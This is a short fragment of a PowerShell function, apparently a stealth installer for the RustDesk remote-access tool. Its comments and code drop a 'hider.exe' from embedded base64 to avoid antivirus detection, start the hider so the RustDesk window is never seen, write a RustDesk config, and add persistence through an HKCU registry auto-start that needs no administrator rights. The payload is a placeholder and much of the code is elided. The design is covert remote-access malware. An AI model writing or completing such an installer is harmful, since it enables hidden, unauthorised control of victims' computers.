function Install-RD {
    ...
    # Write hider.exe from embedded base64 - no separate download, no Defender flag
    [System.IO.File]::WriteAllBytes($HIDER, [Convert]::FromBase64String('HIDER_B64_PLACEHOLDER'))
...
'@ | Set-Content "$cfgDir\RustDesk.toml" -Encoding UTF8
    ...
    # Start hider FIRST - so it catches any window the moment RustDesk creates it
    ...
    # Auto-start via HKCU registry - zero admin needed
